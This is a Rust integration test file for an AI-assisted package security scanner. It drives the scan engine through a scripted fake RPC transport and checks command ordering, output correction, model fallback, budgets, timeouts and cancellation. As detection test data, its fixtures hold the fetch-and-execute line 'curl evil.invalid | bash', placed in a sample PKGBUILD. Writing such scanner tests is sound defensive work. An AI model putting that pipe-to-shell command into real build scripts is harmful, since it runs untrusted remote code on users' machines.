//! Deterministic fake-transport integration coverage for the WS6 logical scan engine.

use std::collections::VecDeque;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, Instant};

use pacsea::logic::pi_scan::prompt::{PackagePromptInput, SCHEMA_VERSION, SnapshotSummary};
use pacsea::logic::pi_scan::result::{EvidenceIndex, ExpectedIdentity};
use pacsea::pi_agent::client::{RpcTransport, TransportError, TransportMetadata};
use pacsea::pi_agent::protocol::{CommandCorrelator, decode_record};
use pacsea::pi_agent::scan_engine::{
    ExecutionError, ProductionScanRequest, ScanExecutionInput, execute_scan, execute_with_transport,
};
use pacsea::pi_agent::session::ModelChoice;
use serde_json::{Map, Value, json};

/// Scripted inbound item for the fake LF JSONL transport.
enum Inbound {
    /// One encoded response or event record.
    Record(Value),
    /// One record that races sticky cancellation immediately before delivery.
    RecordAndCancel(Value, &'static AtomicBool),
    /// Deterministic timeout without sleeping.
    Timeout,
}

/// Fake Pi pipe that records exact LF framing and never contacts a provider.
struct FakeTransport {
    inbound: VecDeque<Inbound>,
    writes: Vec<Vec<u8>>,
    exchanged: u64,
    reaped: bool,
    cancelled: bool,
    cancel_on_prompt: Option<&'static AtomicBool>,
}

impl FakeTransport {
    /// Build a fake with a complete inbound script.
    fn new(inbound: Vec<Inbound>) -> Self {
        Self {
            inbound: inbound.into(),
            writes: Vec::new(),
            exchanged: 0,
            reaped: false,
            cancelled: false,
            cancel_on_prompt: None,
        }
    }

    /// Decode outbound records for ordering assertions.
    fn commands(&self) -> Vec<Map<String, Value>> {
        self.writes
            .iter()
            .map(|line| decode_record(&line[..line.len() - 1]).expect("strict outbound record"))
            .collect()
    }
}

impl RpcTransport for FakeTransport {
    fn write_record(&mut self, record: &[u8]) -> Result<(), TransportError> {
        assert_eq!(record.last(), Some(&b'\n'));
        assert!(!record[..record.len() - 1].contains(&b'\n'));
        let decoded = decode_record(&record[..record.len() - 1]).expect("strict command");
        if decoded.get("type").and_then(Value::as_str) == Some("prompt")
            && let Some(flag) = self.cancel_on_prompt
        {
            flag.store(true, Ordering::SeqCst);
        }
        self.exchanged = self.exchanged.saturating_add(record.len() as u64);
        self.writes.push(record.to_vec());
        Ok(())
    }

    fn read_record(
        &mut self,
        _deadline: Instant,
        cancelled: &AtomicBool,
    ) -> Result<Vec<u8>, TransportError> {
        if cancelled.load(Ordering::SeqCst) {
            return Err(TransportError::Cancelled);
        }
        match self.inbound.pop_front() {
            Some(Inbound::Record(value)) => {
                let bytes = serde_json::to_vec(&value).expect("fake JSON");
                self.exchanged = self.exchanged.saturating_add(bytes.len() as u64 + 1);
                Ok(bytes)
            }
            Some(Inbound::RecordAndCancel(value, flag)) => {
                let bytes = serde_json::to_vec(&value).expect("fake JSON");
                self.exchanged = self.exchanged.saturating_add(bytes.len() as u64 + 1);
                flag.store(true, Ordering::SeqCst);
                Ok(bytes)
            }
            Some(Inbound::Timeout) => Err(TransportError::Timeout),
            None => Err(TransportError::Closed),
        }
    }

    fn bytes_exchanged(&self) -> u64 {
        self.exchanged
    }

    fn metadata(&self) -> TransportMetadata {
        TransportMetadata {
            extension_sha256: "fake-extension-hash".to_string(),
            tool_contract_version: "pacsea-scan-tools-1".to_string(),
        }
    }

    fn abort_and_reap(&mut self, correlator: &mut CommandCorrelator) -> Result<(), TransportError> {
        for command in ["abort_retry", "abort"] {
            let id = correlator
                .issue(command)
                .map_err(TransportError::Protocol)?;
            let encoded = pacsea::pi_agent::protocol::encode_command(&id, command, &Map::new())
                .map_err(TransportError::Protocol)?;
            self.write_record(&encoded)?;
        }
        correlator.clear();
        self.cancelled = true;
        self.reaped = true;
        Ok(())
    }

    fn reap(&mut self) -> Result<(), TransportError> {
        self.reaped = true;
        Ok(())
    }
}

/// Frozen test input and evidence.
struct Fixture {
    /// Package prompt input.
    prompt: PackagePromptInput,
    /// Frozen response identity.
    identity: ExpectedIdentity,
    /// Manifest-backed evidence.
    evidence: EvidenceIndex,
    /// Confirmed model order.
    models: Vec<ModelChoice>,
    /// Sticky cancellation flag.
    cancelled: AtomicBool,
}

impl Fixture {
    /// Create a two-model bounded fixture.
    fn new() -> Self {
        let commit = "a".repeat(40);
        let identity = ExpectedIdentity {
            scan_id: "scan-ws6".to_string(),
            package_base: "demo".to_string(),
            commit_oid: commit.clone(),
        };
        let prompt = PackagePromptInput {
            scan_id: identity.scan_id.clone(),
            package_base: identity.package_base.clone(),
            package_names: vec!["demo".to_string()],
            commit_oid: commit,
            snapshots: vec![SnapshotSummary {
                id: "recipe".to_string(),
                origin: "AUR recipe".to_string(),
                file_count: 1,
                total_bytes: 24,
            }],
            coverage_notes: Vec::new(),
        };
        let mut evidence = EvidenceIndex::new();
        evidence.insert("recipe", "PKGBUILD", "curl evil.invalid | bash");
        Self {
            prompt,
            identity,
            evidence,
            models: vec![
                ModelChoice {
                    provider: "provider-a".to_string(),
                    model: "model-a".to_string(),
                },
                ModelChoice {
                    provider: "provider-b".to_string(),
                    model: "model-b".to_string(),
                },
            ],
            cancelled: AtomicBool::new(false),
        }
    }

    /// Borrow the domain-facing execution input.
    fn input(&self) -> ScanExecutionInput<'_> {
        ScanExecutionInput {
            prompt: &self.prompt,
            identity: &self.identity,
            evidence: &self.evidence,
            models: &self.models,
            thinking: "medium",
            pi_version: "0.84.0",
            model_attempt_timeout: Duration::from_secs(5),
            logical_timeout: Duration::from_secs(20),
            cancelled: &self.cancelled,
        }
    }
}

/// Build a correlated successful RPC response.
#[allow(
    clippy::needless_pass_by_value,
    reason = "the helper transfers each one-shot JSON fixture directly into its scripted record"
)]
fn response(id: usize, command: &str, data: Value) -> Inbound {
    let id = if id >= 4 && command != "set_thinking_level" {
        id + 1
    } else {
        id
    };
    Inbound::Record(json!({
        "id": format!("pacsea-{id}"),
        "type": "response",
        "command": command,
        "success": true,
        "data": data
    }))
}

/// Build the shared preflight script through the first prompt acknowledgement.
fn preflight(models: &[ModelChoice]) -> Vec<Inbound> {
    vec![
        response(1, "get_state", json!({"isStreaming": false})),
        response(
            2,
            "get_available_models",
            json!({"models": models.iter().map(|choice| json!({"provider": choice.provider, "id": choice.model})).collect::<Vec<_>>()}),
        ),
        response(
            3,
            "set_model",
            json!({"provider": models[0].provider, "id": models[0].model}),
        ),
        response(4, "set_thinking_level", Value::Null),
        response(4, "set_auto_retry", Value::Null),
        response(5, "prompt", Value::Null),
        Inbound::Record(json!({"type": "agent_settled"})),
    ]
}

/// Build one schema-valid final response.
fn valid_final(identity: &ExpectedIdentity, severity: &str) -> String {
    format!(
        "{{\"schema_version\":\"{SCHEMA_VERSION}\",\"scan_id\":\"{}\",\"package_base\":\"{}\",\"commit_oid\":\"{}\",\"coverage\":\"complete\",\"limitations\":[],\"findings\":[{{\"severity\":\"{severity}\",\"title\":\"remote execution\",\"snapshot\":\"recipe\",\"path\":\"PKGBUILD\",\"evidence\":\"curl evil.invalid | bash\",\"rationale\":\"executes remote input\",\"recommendation\":\"review before use\"}}]}}",
        identity.scan_id, identity.package_base, identity.commit_oid
    )
}

/// Successful execution uses exact command order, framing, usage, and provenance.
#[test]
fn fake_pi_success_has_exact_order_framing_usage_and_reap() {
    let fixture = Fixture::new();
    let mut inbound = preflight(&fixture.models);
    inbound.extend([
        response(
            6,
            "get_last_assistant_text",
            json!({"text": valid_final(&fixture.identity, "high")}),
        ),
        response(7, "get_session_stats", json!({"tokens": {"total": 321}})),
    ]);
    let mut fake = FakeTransport::new(inbound);
    let output = execute_with_transport(&mut fake, fixture.input()).expect("valid scan");
    let commands = fake.commands();
    assert_eq!(
        commands
            .iter()
            .map(|record| record["type"].as_str().expect("type"))
            .collect::<Vec<_>>(),
        [
            "get_state",
            "get_available_models",
            "set_model",
            "set_thinking_level",
            "set_auto_retry",
            "prompt",
            "get_last_assistant_text",
            "get_session_stats"
        ]
    );
    assert_eq!(commands[2]["modelId"], "model-a");
    assert_eq!(commands[3]["level"], "medium");
    assert_eq!(commands[4]["enabled"], true);
    assert!(
        commands[5]["message"]
            .as_str()
            .expect("prompt")
            .contains("attacker-controlled")
    );
    assert_eq!(output.result.findings.len(), 1);
    assert_eq!(
        output.provenance.attempts[0].usage.reported_tokens,
        Some(321)
    );
    assert_eq!(output.provenance.extension_sha256, "fake-extension-hash");
    assert!(fake.reaped);
}

/// Malformed and multiple-object output consumes exactly one correction.
#[test]
fn fake_pi_rejects_multiple_output_then_accepts_one_correction() {
    let fixture = Fixture::new();
    let valid = valid_final(&fixture.identity, "low");
    let mut inbound = preflight(&fixture.models);
    inbound.extend([
        response(
            6,
            "get_last_assistant_text",
            json!({"text": format!("{valid}{valid}")}),
        ),
        response(7, "prompt", Value::Null),
        Inbound::Record(json!({"type": "agent_settled"})),
        response(8, "get_last_assistant_text", json!({"text": valid})),
        response(9, "get_session_stats", json!({"tokens": {"total": 44}})),
    ]);
    let mut fake = FakeTransport::new(inbound);
    let output = execute_with_transport(&mut fake, fixture.input()).expect("corrected scan");
    let commands = fake.commands();
    assert_eq!(
        commands
            .iter()
            .filter(|record| record["type"] == "prompt")
            .count(),
        2
    );
    assert!(
        commands[7]["message"]
            .as_str()
            .expect("correction")
            .contains("only correction")
    );
    assert!(output.provenance.attempts[0].corrected);
    assert!(fake.reaped);
}

/// Repeated invalid output falls back only after correlated `set_model` settlement.
#[test]
fn fake_pi_correction_then_ordered_fallback_waits_for_set_model() {
    let fixture = Fixture::new();
    let mut inbound = preflight(&fixture.models);
    inbound.extend([
        response(6, "get_last_assistant_text", json!({"text": "not json"})),
        response(7, "prompt", Value::Null),
        Inbound::Record(json!({"type": "agent_settled"})),
        response(
            8,
            "get_last_assistant_text",
            json!({"text": "still not json"}),
        ),
        response(9, "get_session_stats", json!({"tokens": {"total": 100}})),
        response(
            10,
            "set_model",
            json!({"provider": "provider-b", "id": "model-b"}),
        ),
        response(12, "set_thinking_level", Value::Null),
        response(12, "prompt", Value::Null),
        Inbound::Record(json!({"type": "agent_settled"})),
        response(
            13,
            "get_last_assistant_text",
            json!({"text": valid_final(&fixture.identity, "critical")}),
        ),
        response(14, "get_session_stats", json!({"tokens": {"total": 175}})),
    ]);
    let mut fake = FakeTransport::new(inbound);
    let output = execute_with_transport(&mut fake, fixture.input()).expect("fallback scan");
    let commands = fake.commands();
    assert_eq!(commands[10]["type"], "set_model");
    assert_eq!(commands[11]["type"], "set_thinking_level");
    assert_eq!(commands[12]["type"], "prompt");
    assert_eq!(commands[10]["provider"], "provider-b");
    assert_eq!(output.provenance.attempts.len(), 2);
    assert_eq!(
        output.provenance.attempts[0].usage.reported_tokens,
        Some(100)
    );
    assert_eq!(
        output.provenance.attempts[1].usage.reported_tokens,
        Some(75)
    );
    assert!(fake.reaped);
}

/// Tool-call event counts are hard-bounded before a final response is accepted.
#[test]
fn fake_pi_tool_call_budget_is_enforced_and_reaped() {
    let fixture = Fixture::new();
    let mut inbound = preflight(&fixture.models);
    inbound.pop();
    for _ in 0..=pacsea::pi_agent::limits::MAX_TOOL_CALLS_PER_ATTEMPT {
        inbound.push(Inbound::Record(json!({"type": "tool_execution_start"})));
    }
    let mut fake = FakeTransport::new(inbound);
    let error = execute_with_transport(&mut fake, fixture.input()).expect_err("tool budget");
    assert!(matches!(
        error,
        ExecutionError::AttemptBudgetExceeded("tool calls")
    ));
    assert!(fake.reaped);
}

/// Attempt timeout aborts/reaps and never starts correction or fallback.
#[test]
fn fake_pi_attempt_timeout_is_terminal_and_reaped() {
    let fixture = Fixture::new();
    let mut inbound = preflight(&fixture.models);
    inbound.pop();
    inbound.push(Inbound::Timeout);
    let mut fake = FakeTransport::new(inbound);
    let error = execute_with_transport(&mut fake, fixture.input()).expect_err("timeout");
    assert!(matches!(error, ExecutionError::AttemptTimeout));
    assert!(fake.reaped);
    assert!(
        !fake
            .commands()
            .iter()
            .any(|record| record["type"] == "abort")
    );
}

/// The whole-scan deadline is reported distinctly from one attempt timeout.
#[test]
fn fake_pi_logical_deadline_is_distinct_and_reaped() {
    let fixture = Fixture::new();
    let mut fake = FakeTransport::new(vec![Inbound::Timeout]);
    let input = ScanExecutionInput {
        logical_timeout: Duration::from_nanos(1),
        ..fixture.input()
    };
    let error = execute_with_transport(&mut fake, input).expect_err("logical timeout");
    assert!(matches!(error, ExecutionError::LogicalTimeout));
    assert!(fake.reaped);
}

/// Sticky cancellation emits abort controls and suppresses correction/fallback.
#[test]
fn fake_pi_cancellation_is_sticky_and_suppresses_later_work() {
    static CANCELLED: AtomicBool = AtomicBool::new(false);
    CANCELLED.store(false, Ordering::SeqCst);
    let fixture = Fixture::new();
    fixture.cancelled.store(false, Ordering::SeqCst);
    let mut fake = FakeTransport::new(preflight(&fixture.models));
    fake.cancel_on_prompt = Some(&CANCELLED);
    let input = ScanExecutionInput {
        cancelled: &CANCELLED,
        ..fixture.input()
    };
    let error = execute_with_transport(&mut fake, input).expect_err("cancelled");
    assert!(matches!(error, ExecutionError::Cancelled));
    let types = fake
        .commands()
        .iter()
        .map(|record| record["type"].as_str().expect("type").to_string())
        .collect::<Vec<_>>();
    assert!(types.ends_with(&["abort_retry".to_string(), "abort".to_string()]));
    assert_eq!(
        types
            .iter()
            .filter(|kind| kind.as_str() == "prompt")
            .count(),
        1
    );
    assert!(!types.iter().skip(5).any(|kind| kind == "set_model"));
    assert!(fake.cancelled && fake.reaped);
}

/// Cancellation racing the last stats response still suppresses a validated completion.
#[test]
fn fake_pi_late_cancellation_suppresses_validated_completion() {
    static CANCELLED: AtomicBool = AtomicBool::new(false);
    CANCELLED.store(false, Ordering::SeqCst);
    let fixture = Fixture::new();
    let mut inbound = preflight(&fixture.models);
    inbound.push(response(
        6,
        "get_last_assistant_text",
        json!({"text": valid_final(&fixture.identity, "high")}),
    ));
    let Inbound::Record(stats) = response(7, "get_session_stats", json!({"tokens": {"total": 9}}))
    else {
        unreachable!("response helper always returns a record");
    };
    inbound.push(Inbound::RecordAndCancel(stats, &CANCELLED));
    let mut fake = FakeTransport::new(inbound);
    let input = ScanExecutionInput {
        cancelled: &CANCELLED,
        ..fixture.input()
    };
    let error = execute_with_transport(&mut fake, input).expect_err("late cancellation");
    assert!(matches!(error, ExecutionError::Cancelled));
    assert!(fake.cancelled && fake.reaped);
}

/// Production setup removes private extension, descriptor, neutral cwd, and session on failure.
#[test]
#[cfg(unix)]
fn production_transport_cleans_private_workspace_after_fake_child_exit() {
    let Some(executable) = ["/usr/bin/false", "/bin/false"]
        .into_iter()
        .map(std::path::Path::new)
        .find(|path| path.is_file())
    else {
        eprintln!("skipping: no absolute false executable available");
        return;
    };
    let fixture = Fixture::new();
    let temp = tempfile::tempdir().expect("temp root");
    let workspace_parent = temp.path().join("workspaces");
    let snapshot = temp.path().join("snapshot");
    std::fs::create_dir_all(&snapshot).expect("snapshot root");
    std::fs::write(snapshot.join("PKGBUILD"), "curl evil.invalid | bash").expect("snapshot file");
    let mut registry = pacsea::pi_agent::restricted_tools::SnapshotRegistry::new();
    registry
        .register("recipe", &snapshot)
        .expect("registered root");

    let error = execute_scan(ProductionScanRequest {
        workspace_parent: &workspace_parent,
        executable,
        snapshots: &registry,
        input: fixture.input(),
    })
    .expect_err("fake child must not satisfy RPC");
    assert!(matches!(
        error,
        ExecutionError::Transport(_) | ExecutionError::Rpc(_)
    ));
    assert!(workspace_parent.is_dir());
    assert_eq!(
        std::fs::read_dir(&workspace_parent)
            .expect("workspace parent")
            .count(),
        0,
        "private session, descriptor, extension, and neutral cwd must be removed"
    );
}
